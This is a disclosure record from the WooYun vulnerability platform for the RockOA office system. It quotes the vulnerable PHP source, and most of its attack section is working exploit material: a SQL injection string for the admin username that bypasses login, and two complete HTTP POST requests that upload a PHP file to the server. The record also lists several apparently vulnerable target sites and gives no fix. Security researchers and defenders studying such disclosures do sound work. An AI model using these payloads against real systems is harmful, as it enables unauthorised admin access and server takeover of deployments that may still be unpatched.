{"id": 79047, "wybug_id": "wooyun-2015-0158998", "wybug_title": "rockoa系统sql注入(有条件限制)", "wybug_corp": "rockoa", "wybug_author": "路人甲", "wybug_date": "2015-12-08 10:14", "wybug_open_date": "2016-01-21 18:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt 详细说明：  0x01 后台bypassC:/phpStudy/WWW/rockoa/webrock/login/loginAction.php\npublic function checkAjax()\t{\t\t$adminuser\t= $this->post('adminuser');\t\t$adminpass\t= $this->post('adminpass');\t\t$rempass\t= $this->post('rempass');\t\t$jmpass\t\t= $this->post('jmpass');\t\t$adminpass1\t= $adminpass;\t\tif($jmpass == 'true')$adminpass=$this->jm->uncrypt($adminpass);\t\t$highpass\t= HIGHPASS;\t\t$lglx\t\t= '';\t\t$msg\t\t= '';\t\tif($this->isempt($adminuser))$msg='帐号不能为空';\t\t$log\t\t= m('log');\t\tif($msg==''){\t\t\t$us\t= $this->db->getone('[Q]admin', \"`user`='$adminuser' and `status`=1 and `type`=1 and `state`<>5\",'`pass`,`id`,`name`,`user`,`style`');\t\t\tif(!$us){\t\t\t\t$msg = '帐号不存在';\t\t\t}else{\t\t\t\t$pass= $us['pass'];\t\t\t\tif(md5($adminpass)!=$pass)$msg='密码不对';\t\t\t\tif($adminpass==$highpass || $adminpass1 == $highpass){\t\t\t\t\t$msg='';\t\t\t\t\t$lglx = '超级密码';\t\t\t\t}\t\t\t\t}\t\t}\t\t\t\tif($msg==''){\t\t\t$adminid\t= $us['id'];\t\t\t$this->db->record('[Q]admin',\"`loginci`=`loginci`+1,`lastdt`='$this->now',`lastip`='$this->ip'\",\"`id`='$adminid'\");\t\t\t$this->rock->savesession(array(\t\t\t\tQOM.'adminid'\t=> $us['id'],\t\t\t\tQOM.'adminname'\t=> $us['name'],\t\t\t\tQOM.'adminuser'\t=> $us['user'],\t\t\t\tQOM.'adminstyle'=> $us['style']\t\t\t));\t\t\t\t\t\t$this->rock->savecookie(QOM.'ca_adminuser', $us['user']);\t\t\t$this->rock->savecookie(QOM.'ca_rempass', $rempass);\t\t\t$ca_adminpass\t= $this->jm->encrypt($adminpass);\t\t\tif($rempass=='0')$ca_adminpass='';\t\t\t$this->rock->savecookie(QOM.'ca_adminpass', $ca_adminpass);\t\t\t$this->rock->savecookie(QOM.'ca_adminstyle', $us['style']);\t\t\t$msg='success';\t\t\t$log->addlog('登录','['.$adminuser.']'.$lglx.'登录成功', array('optid'=>$us['id'], 'optname'=>$us['name']));\t\t}else{\t\t\t$log->addlog('登录','['.$adminuser.']'.$msg.'');\t\t}\t\techo $msg;\t}\n在登陆的地方存在注入，但是会验证一次密码，所以我们通过union select 型的注入直接bypass，进入后台。构造adminuser为\nasd' union select '202cb962ac59075b964b07152d234b70',1,'管理员','admin',1#\nadminpass为123这样就可以直接进入后台了。\n\n\n\n0x02 Getshell第一种情况 需要登录，然后无限制getshellC:/phpStudy/WWW/rockoa/mode/upload/uploadajax.php\nif($action == 'send'){\t\tif(!$_POST)exit('Sorry!,send');\t$sendci\t\t= (int)$rock->post('sendci')+1;\t$maxsend\t= (int)$rock->post('maxsend');\t$maxwidth\t= (int)$rock->post('maxwidth');\t$thumbtype\t= (int)$rock->post('thumbtype');\t$sendcont\t= $rock->post('sendcont');\t$savetype\t= $rock->post('savetype','temp');\t$filename\t= $rock->post('filename');\t$filetype\t= $rock->post('filetype');\t$fileext\t= trim($rock->post('fileext'));\t$filesize\t= $rock->post('filesize');\t$filesizecn\t= $rock->post('filesizecn');\t$newfile\t= $rock->post('newfile');\t$mkdir\t\t= $rock->post('mkdir');\t$savepath\t= $rock->post('savepath');//另存路径\t$thumbnail\t= $rock->post('thumbnail');}$smkdir\t\t= '../../upload/'.$mkdir.'';if(!file_exists($smkdir))mkdir($smkdir);$allfile\t= ''.$smkdir.'/'.$newfile.'';$tempfile\t= $allfile.'.temp';$filepath\t= substr($tempfile,3);$thumbpath\t= '';//所累图地址$width\t\t= 0;$height\t\t= 0;$fc\t= fopen($tempfile, 'a');fwrite($fc,$sendcont);fclose($fc);$id\t= 0;if($sendci==$maxsend){\t\t$optid\t= (int)$rock->session(QOM.'adminid',0);\t$imgext\t= '|jpg|gif|png|jpeg|bmp|';\t$boolc\t= $rock->contain($imgext, '|'.$fileext.'|');\t$ztfile\t= $imgext.'doc|docx|xls|xlsx|ppt|pptx|pdf|swf|rar|zip|txt|gz|wav|mp3|wma|chm|';\t$botxtl\t= $rock->contain($ztfile,'|'.$fileext.'|');\t$boolc1\t= $rock->isempt($savepath);\tif(!$boolc1 && $optid==0)$boolc1 = true;\t$izztbo = false;\tif(!$boolc1 || $botxtl)$izztbo = true;\tif($izztbo){\t\t$content\t= file_get_contents($tempfile);\t\t$temp1file\t= ''.$allfile.'.'.$fileext.'';\t\t$a64basec\t= base64_decode($content);\t\t\t\tif(!$boolc1){\t\t\tfile_put_contents(ROOT_PATH.''.$savepath.''.iconv('utf-8','gb2312',$filename).'', $a64basec);\t\t\tunlink($tempfile);\t\t}else{\t\t\tfile_put_contents($temp1file, $a64basec);\t\t\tunlink($tempfile);\t\t\tif($boolc){\t\t\t\tlist($width, $height) = getimagesize($temp1file);\t\t\t\tif($rock->isempt($width)){\t\t\t\t\t$width = 0;\t\t\t\t\t$height = 0;\t\t\t\t}\t\t\t}\t\t}\t\t$filepath\t= substr($temp1file,3);\t\t}\t$filepath\t= str_replace('../','',$filepath);\t$thumbpath\t= $filepath;\n这段代码的意思就是先生成一个temp文件，其中内容是base64过的，然后从temp文件里面读取内容并且base64解码一次，然后写入文件中。\nfile_put_contents(ROOT_PATH.''.$savepath.''.iconv('utf-8','gb2312',$filename).'', $a64basec);\n其中savepath和filename变量我们都可以控制，这样就可以写shell了。在进入这个流程之前，还有两个逻辑判断要izztbo变量为真 boolc1变量为假其中if(!$boolc1 || $botxtl)$izztbo = true; 只要一个为真就行，由于boolc1又savepath是否为空的来，我们只要给savepath赋值即可。最好构造这样的数据包\nPOST /rockoa/mode/upload/uploadajax.php?action=send&rnd=0.11527019962152985&p=webrock HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**/rockoa/mode/upload/upload.php?callback=rock.up1449383669147_6905&upkey=20151206143456244282&p=webrock&title=%E5%9F%B9%E8%AE%AD%E6%96%87%E6%A1%A3&params1=%E5%9F%B9%E8%AE%AD%E6%96%87%E6%A1%A3&params2=141&opennew=trueContent-Length: 222Cookie: rock_ca_adminuser=admin; rock_ca_rempass=0; rock_ca_adminstyle=1; PHPSESSID=gkuo4ai9bcbciioepdv7u84k17X-Forwarded-For: **.**.**.**Connection: keep-alivePragma: no-cacheCache-Control: no-cachesendcont=PD9waHAgcGhwaW5mbygpPz4=&filename=aax.php&maxsend=1&sendci=0&filetype=text%2Fphp&fileext=php&filesize=9145&filesizecn=8.93+KB&mkdir=2015-12&newfile=06_1435027893&savepath=/upload/&thumbnail=&maxwidth=0&thumbtype=0\n就可以在upload下生成一个aax.php的shell第二种情况  无需登录，但是有限制条件由于没有登录所以$optid\t= (int)$rock->session(QOM.'adminid',0);获取的opted的值为0 在后面这个判断if(!$boolc1 && $optid==0)$boolc1 = true;导致boolc1为真，所以后面的流程都不能进去，就只能写一个tempfile 了，由于$tempfile\t= $allfile.'.temp';  所以只能配合apache的解析漏洞或者iis的解析漏洞利用了，直接构造数据包\nPOST /rockoa/mode/upload/uploadajax.php?action=send&rnd=0.11527019962152985&p=webrock HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**/rockoa/mode/upload/upload.php?callback=rock.up1449383669147_6905&upkey=20151206143456244282&p=webrock&title=%E5%9F%B9%E8%AE%AD%E6%96%87%E6%A1%A3&params1=%E5%9F%B9%E8%AE%AD%E6%96%87%E6%A1%A3&params2=141&opennew=trueContent-Length: 211X-Forwarded-For: **.**.**.**Connection: keep-alivePragma: no-cacheCache-Control: no-cachesendcont=<?php phpinfo()?>&filename=aax.php&maxsend=1&sendci=0&filetype=text%2Fphp&fileext=php&filesize=9145&filesizecn=8.93+KB&mkdir=2015-12&newfile=test.php&savepath1=/upload/&thumbnail=&maxwidth=0&thumbtype=0\n然后生成\n{success:true, msg:\"246\",filepath:\"upload/2015-12/test.php.temp\", sendci:1, thumbpath:\"upload/2015-12/test.php.temp\",width:0,height:0}\n随便测试了一个\nhttp://**.**.**.**/upload/2015-12/test.php.php\n   漏洞证明：  \n\n\n\n\n\n\n\n案例\nhttp://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**/ http://**.**.**.**daik.pw/ http://the18.club/ http://**.**.**.**/\n   修复方案：  你们专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}